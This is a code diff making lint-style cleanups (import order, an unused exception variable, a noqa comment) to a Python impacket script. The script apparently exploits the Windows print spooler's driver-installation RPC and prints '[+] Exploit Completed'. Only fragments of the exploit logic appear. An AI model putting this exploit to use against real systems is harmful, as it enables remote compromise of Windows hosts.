@@ -1,12 +1,12 @@
 # Under Maintenance
 
-from impacket.dcerpc.v5 import rprn
-from impacket.dcerpc.v5 import transport
+import argparse
+import pathlib
+import sys
+
+from impacket.dcerpc.v5 import rprn, transport
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.structure import Structure
-import argparse
-import sys
-import pathlib
 
 
 # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
@@ -131,7 +131,7 @@ def main(dce, pDriverPath, share, handle=NULL):
             if resp["ErrorCode"] == 0:
                 print("[+] Exploit Completed")
                 sys.exit()
-        except Exception as e:
+        except Exception:
             # print(e)
             pass
 
@@ -238,7 +238,7 @@ Example;
                 str(pathlib.PureWindowsPath(blob["DriverPathArray"]).parent)
                 + "\\UNIDRV.DLL"
             )
-            if not "FileRepository" in pDriverPath:
+            if not "FileRepository" in pDriverPath:  # noqa: E713
                 print(
                     "[-] pDriverPath {0}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....".format(
                         pDriverPath
